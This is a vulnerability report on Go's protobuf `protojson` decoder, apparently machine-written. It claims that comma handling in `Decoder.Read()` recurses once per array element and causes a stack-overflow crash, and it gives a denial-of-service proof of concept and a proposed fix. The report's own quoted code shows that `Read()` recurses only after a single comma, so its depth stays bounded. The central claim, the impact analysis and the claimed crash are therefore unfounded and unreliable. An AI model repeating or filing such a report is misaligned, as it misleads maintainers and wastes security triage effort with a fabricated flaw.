### Title
Unbounded self-recursion on comma tokens in `Decoder.Read()` causes stack overflow when parsing JSON with many array/object elements - ([File: internal/encoding/json/decode.go])

### Summary
`protojson.Unmarshal` parses JSON messages using an internal token-based decoder, `internal/encoding/json.Decoder`. Its `Read()` method automatically skips over comma separators by recursively calling itself once per comma encountered in the input. This recursion is entirely separate from the `RecursionLimit` / `MaximumObjectGraphDepth`-style guard that `protojson` applies to nested `ObjectOpen`/`ArrayOpen` tokens. As a result, a flat JSON array or object with a very large number of elements (no nesting required) drives one Go-stack frame per comma, exhausting the goroutine stack and crashing the process with an uncatchable stack-overflow fault — the same bug class described in the MessagePack-CSharp advisory (recursive separator consumption without depth/iteration bounds), just triggered by sequence length instead of nesting depth.

### Finding Description
`internal/encoding/json.Decoder.Read()` parses the next JSON token and, if it is a comma, recurses:

```go
// Update d.lastToken only after validating token to be in the right sequence.
d.lastToken = tok

if d.lastToken.kind == comma {
    return d.Read()
}
return tok, nil
``` [1](#0-0) 

This recursive call happens once for every comma token in the input stream — i.e., once per element in a JSON array/object after the first. It is unconditional and unrelated to nesting depth.

`protojson`'s only depth defense, `UnmarshalOptions.RecursionLimit`, is enforced solely in `decoder.unmarshalMessage` (decrementing on message entry) and in `decoder.skipJSONValue` (counting `ObjectOpen`/`ArrayOpen` tokens): [2](#0-1) [3](#0-2) 

Neither of these tracks or limits the number of *sibling* elements/fields separated by commas within a single array/object — only the nesting depth of opens. `unmarshalList` reads list elements in a simple loop via `d.Peek()`/`d.Read()`, so a long flat array like `{"repeatedInt32":[1,1,1,...,1]}` never increases `RecursionLimit` accounting, yet each comma between elements adds a Go stack frame inside `Decoder.Read()`. [4](#0-3) 

This is structurally analogous to `TinyJsonReader.ReadNextToken()`'s separator self-recursion in the report (issue `MESSAGEPACKCSHARP-091`): a tokenizer recurses on comma/colon characters with no depth or count limit, so attacker/caller-controlled *width* (not nesting) of input drives unbounded recursion.

### Impact Explanation
Any code path that calls `protojson.Unmarshal`/`UnmarshalOptions.Unmarshal` on externally supplied JSON with a large flat array or a message/map with many entries can be driven to consume stack proportional to the element count, independent of the configured `RecursionLimit`. Because Go's runtime turns stack exhaustion into a fatal, unrecoverable process crash (`fatal error: stack overflow`, not a `panic` that can be `recover()`ed), this is a denial-of-service against any service that accepts trusted-schema JSON payloads (e.g. gRPC-gateway/JSON transcoding endpoints, config/import pipelines) via `protojson`. It affects availability of the whole process, not just the request.

### Likelihood Explanation
Reaching this path requires nothing more than calling `protojson.Unmarshal` on a JSON document that contains one array or object with a very large number of comma-separated elements — a trivial, single, well-formed JSON payload against any normal proto message with a repeated field or map field (e.g. `TestAllTypes.repeatedInt32`). No custom resolver, malicious descriptor, or privileged caller is needed, and `UnmarshalOptions.RecursionLimit`/`DiscardUnknown` provide no mitigation since they never account for comma count.

### Recommendation
Rewrite `Decoder.Read()`'s comma-skipping logic in `internal/encoding/json/decode.go` to use an iterative loop instead of self-recursion, e.g.:
```go
for {
    tok, err := d.parseNext()
    ...
    if tok.kind != comma {
        return tok, nil
    }
    // validate + update lastToken, then loop instead of recursing
}
```
This removes the per-comma stack frame while preserving existing comma validation semantics.

### Proof of Concept
```go
package main

import (
	"bytes"
	"fmt"

	"google.golang.org/protobuf/encoding/protojson"
	testpb "google.golang.org/protobuf/internal/testprotos/test" // TestAllTypes
)

func main() {
	var buf bytes.Buffer
	buf.WriteString(`{"repeatedInt32":[`)
	for i := 0; i < 50_000_000; i++ { // large flat array, no nesting
		if i > 0 {
			buf.WriteByte(',')
		}
		buf.WriteByte('1')
	}
	buf.WriteString(`]}`)

	m := &testpb.TestAllTypes{}
	err := protojson.Unmarshal(buf.Bytes(), m) // crashes with stack overflow before returning
	fmt.Println(err)
}
```
The `RecursionLimit` default (`protowire.DefaultRecursionLimit`) never triggers because the array is not nested; each of the ~50,000,000 commas adds one frame via the self-recursive `return d.Read()` call in `internal/encoding/json/decode.go`, exhausting the goroutine stack and crashing the process with `fatal error: stack overflow` — an uncatchable failure equivalent to the JSON-conversion recursion issues described in GHSA-cj9g-3mj2-g8vv.

### Citations

**File:** internal/encoding/json/decode.go (L145-151)
```go
	// Update d.lastToken only after validating token to be in the right sequence.
	d.lastToken = tok

	if d.lastToken.kind == comma {
		return d.Read()
	}
	return tok, nil
```

**File:** encoding/protojson/decode.go (L123-128)
```go
// unmarshalMessage unmarshals a message into the given protoreflect.Message.
func (d decoder) unmarshalMessage(m protoreflect.Message, skipTypeURL bool) error {
	d.opts.RecursionLimit--
	if d.opts.RecursionLimit < 0 {
		return errors.New("exceeded max recursion depth")
	}
```

**File:** encoding/protojson/decode.go (L525-552)
```go
func (d decoder) unmarshalList(list protoreflect.List, fd protoreflect.FieldDescriptor) error {
	tok, err := d.Read()
	if err != nil {
		return err
	}
	if tok.Kind() != json.ArrayOpen {
		return d.unexpectedTokenError(tok)
	}

	switch fd.Kind() {
	case protoreflect.MessageKind, protoreflect.GroupKind:
		for {
			tok, err := d.Peek()
			if err != nil {
				return err
			}

			if tok.Kind() == json.ArrayClose {
				d.Read()
				return nil
			}

			val := list.NewElement()
			if err := d.unmarshalMessage(val.Message(), false); err != nil {
				return err
			}
			list.Append(val)
		}
```

**File:** encoding/protojson/well_known_types.go (L313-337)
```go
func (d decoder) skipJSONValue() error {
	var open int
	for {
		tok, err := d.Read()
		if err != nil {
			return err
		}
		switch tok.Kind() {
		case json.ObjectClose, json.ArrayClose:
			open--
		case json.ObjectOpen, json.ArrayOpen:
			open++
			if open > d.opts.RecursionLimit {
				return errors.New("exceeded max recursion depth")
			}
		case json.EOF:
			// This can only happen if there's a bug in Decoder.Read.
			// Avoid an infinite loop if this does happen.
			return errors.New("unexpected EOF")
		}
		if open == 0 {
			return nil
		}
	}
}
```
